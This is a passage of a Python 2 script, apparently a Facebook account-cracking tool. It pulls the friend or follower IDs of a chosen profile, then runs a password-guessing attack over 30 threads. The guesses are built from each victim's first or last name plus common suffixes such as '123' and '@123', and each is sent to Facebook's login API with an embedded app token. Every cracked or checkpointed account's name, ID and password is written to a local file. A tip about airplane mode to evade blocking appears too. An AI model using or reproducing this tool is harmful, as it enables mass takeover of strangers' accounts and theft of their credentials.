                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'].lower() + '@123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '007'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '123456789'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m--------------------------------------------------'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mFinished ...'
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;93m\xe2\x97\x8f\x1b[1;97m] \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mdone/indo.txt'
    print '\x1b[1;96m--------------------------------------------------'
    raw_input('\x1b[1;97m[<\x1b[1;93mBack\x1b[1;97m>]')
    menu()


def crack_follow():
    toket = open('login.txt', 'r').read()
    os.system('clear')
    print logo
    idt = raw_input('\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mID Public/friend \x1b[1;91m:\x1b[1;92m ')
    try:
        jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
        op = json.loads(jok.text)
        print '\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mNama \x1b[1;91m:\x1b[1;92m ' + op['name']
    except KeyError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] ID public/friend there is no !'
        raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
        menu()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] No internet Conection !'
        keluar()

    r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + toket)
    z = json.loads(r.text)
    for i in z['data']:
        id.append(i['id'])

    print '\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mTotal ID Followers \x1b[1;91m:\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mStop Tekan CTRL+Z'
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mCrack Starting ' + o,
        sys.stdout.flush()
        time.sleep(1)

    print '\x1b[1;96m--------------------------------------------------'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mUse Airplane Mode If Nothing Is Working'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95mCheckpoint Account Open After 7 days'
    print '\n\x1b[1;97m[\x1b[1;95m\xe2\x97\x8f\x1b[1;97m] \x1b[1;95m Crated By : Angga Kurniawan'
    print '\x1b[1;96m--------------------------------------------------'

    def main(arg):
        sys.stdout.write(('\r[]').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'].lower() + '@123'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = j['first_name'].lower() + '007'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n[\xc3\x97] CEKPOINT \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m[\x1b[1;92m\xc3\x97\x1b[1;97m] Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n[\xc3\x97] SUCCESSFUL \n[\xc3\x97] Nama     > ' + j['name'] + '\n[\xc3\x97] User     > ' + zowe + '\n[\xc3\x97] Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m[\x1b[1;93m\xc3\x97\x1b[1;97m] Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
